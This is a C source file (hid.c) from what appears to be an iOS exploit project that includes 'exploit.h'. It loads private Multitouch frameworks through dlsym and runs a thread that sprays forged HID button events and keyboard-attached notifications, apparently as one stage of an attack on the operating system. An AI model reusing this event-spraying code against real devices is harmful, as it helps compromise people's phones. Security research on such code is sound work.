//
//  hid.c
//  queue_6
//
//  Created by staturnz on 5/16/25.
//

#include "exploit.h"
#include "util.h"
#include "hid.h"

static bool stop_hid_thread = false;
static IOHIDEventSystemClientRef hid_system_client = NULL;
static void *(*MTDeviceCreateDefault)(void);
static int (*mt_PostNotificationEvent)(void *a1, int a2);
static int (*mt_PostNotificationEventToDriver)(void *a1, char a2);
static int (*mt_setPropertyInternal)(void *a1, int a2, CFNumberRef num);
static void *(*mt_initHIDManager)(void *this);
static void *(*mt_init2)(int a1, int a2, CFTypeRef cf, int a4, int a5);

void hid_dispatch_event(IOHIDEventRef event) {
    IOHIDEventSetSenderID(event, 0xdefacedbeeffece5);
    IOHIDEventSystemClientDispatchEvent(hid_system_client, event);
}

void hid_dispatch_button_press(uint16_t page, uint16_t usage, useconds_t time) {
    IOHIDEventRef event_down = IOHIDEventCreateKeyboardEvent(NULL, mach_absolute_time(), page, usage, 1, 0);
    hid_dispatch_event(event_down);
    
    usleep(time);
    IOHIDEventRef event_up = IOHIDEventCreateKeyboardEvent(NULL, mach_absolute_time(), page, usage, 0, 0);
    hid_dispatch_event(event_up);
}

void hid_create_user_device(mach_port_t client) {
    uint64_t input_scalar[16] = {0};
    char input_struct[4096] = {0};
    uint64_t output_scalar[16] = {0};
    char output_struct[4096] = {0};

    uint32_t input_scalar_count = 1;
    size_t input_struct_count = 0;
    uint32_t output_scalar_count = 0;
    size_t output_struct_count = 0;
    
    IOConnectCallMethod(client, 0, input_scalar, input_scalar_count, input_struct, input_struct_count,
                        output_scalar, &output_scalar_count, output_struct, &output_struct_count);
}

void *hid_event_spray_handler(void *args) {
   // void *device = MTDeviceCreateDefault();
    
   // void *manager = mt_init2(mt_initHIDManager(calloc(1, 0x78)), calloc(1, 0x78), CFStringCreateCopy(NULL, CFSTR("joe")), calloc(1, 0x78), calloc(1, 0x78));
   // print_log("device: 0x%x\n", device);
   // print_log("manager: 0x%x\n", manager);

    //IOHIDEventRef event = NULL;
    while (!stop_hid_thread) {
      //  event = IOHIDEventCreateAccelerometerEvent(NULL, mach_absolute_time(), 0.04, 0.04, -0.98, 0);
     //   hid_dispatch_event(event);
        
      //  usleep(500000);
      //  event = IOHIDEventCreateAccelerometerEvent(NULL, mach_absolute_time(),2.32, 2.32, 0.98, 0);
      //  hid_dispatch_event(event);
        
        hid_dispatch_button_press(12, 0xb4, 5000);
        notify_post("GSEventHardwareKeyboardAttached");
        usleep(10000);
        
        /*
        if (device != NULL) {
            mt_PostNotificationEvent(device, 3);
            mt_PostNotificationEventToDriver(device, 103);
            usleep(10000);
            mt_PostNotificationEvent(device, 4);
            mt_PostNotificationEventToDriver(device, 104);
            usleep(10000);
            
            int kr = mt_setPropertyInternal(manager, 11, kCFBooleanFalse);
            print_log("kr: %d\n", kr);
        }
         */
    }
    return NULL;
}

void hid_event_spray_start(void) {
    stop_hid_thread = false;
    pthread_t thread;
    pthread_create(&thread, NULL, hid_event_spray_handler, NULL);
}

void hid_event_spray_stop(void) {
    stop_hid_thread = true;
}

int hid_init(void) {
    void *handle = dlopen("/System/Library/PrivateFrameworks/MultitouchSupport.framework/MultitouchSupport", RTLD_NOW);
    if (handle == NULL) return -1;
   // print_log("handle: 0x%x\n", handle);

    void *handle2 = dlopen("/System/Library/Extensions/AppleMultitouchSPI.kext/PlugIns/MultitouchHID.plugin/MultitouchHID", RTLD_NOW);
    if (handle2 == NULL) return -1;
    

  //  print_log("handle2: 0x%x\n", handle2);
    if ((mt_initHIDManager = dlsym(handle2, "_ZN18MTSimpleHIDManagerC1Ev")) == NULL) return -1;
  //  print_log("mt_initHIDManager: 0x%x\n", mt_initHIDManager);

    if ((mt_setPropertyInternal = dlsym(handle2, "_ZN18MTSimpleHIDManager19setPropertyInternalE18_MTHIDPropertyTypePKv")) == NULL) return -1;
  //  print_log("mt_setPropertyInternal: 0x%x\n", mt_setPropertyInternal);
    
    if ((mt_init2 = dlsym(handle2, "_ZN18MTSimpleHIDManager13createManagerEP18MultitouchHIDClassP10__MTDevice12MTParserType15MTParserOptions")) == NULL) return -1;
   // print_log("mt_init2: 0x%x\n", mt_init2);
    
    
    if ((MTDeviceCreateDefault = dlsym(handle, "MTDeviceCreateDefault")) == NULL) return -1;
    if ((mt_PostNotificationEvent = dlsym(handle, "mt_PostNotificationEvent")) == NULL) return -1;
    if ((mt_PostNotificationEventToDriver = dlsym(handle, "mt_PostNotificationEventToDriver")) == NULL) return -1;
    if ((hid_system_client = IOHIDEventSystemClientCreate(NULL)) == NULL) return -1;
    return 0;
}
